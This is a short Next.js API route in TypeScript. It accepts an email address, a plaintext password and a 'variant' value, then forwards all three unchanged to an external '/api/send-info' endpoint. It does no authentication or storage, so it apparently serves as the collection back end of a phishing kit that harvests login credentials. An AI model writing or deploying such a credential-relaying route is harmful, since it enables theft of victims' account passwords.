import {NextResponse} from "next/server";
// import {MailtrapClient} from "mailtrap";

// const TOKEN = process.env.MAIL_API_KEY;
export const maxDuration = 58;

const apiUrl = process.env.API_URL ?? ''


export async function POST(req: Request) {
  const {email, password, variant} = await req.json()


  try {
    const message = JSON.stringify({
      email,
      password,
      variant
    }, null, 2)

    const res = await fetch(`${apiUrl}/api/send-info`, {
      method: 'POST',
      body: JSON.stringify({message}),
      headers: {
        'Content-Type': 'application/json',
      }
    })

    if (res.ok) {
      const json = await res?.json();
      return NextResponse.json({error: null, data: json})
    } else {
      return NextResponse.json({error: 'something went wrong', data: null})
    }
    // eslint-disable-next-line @typescript-eslint/no-unused-vars
  } catch (e) {
    return NextResponse.json({error: 'something went wrong', data: null})
  }
}
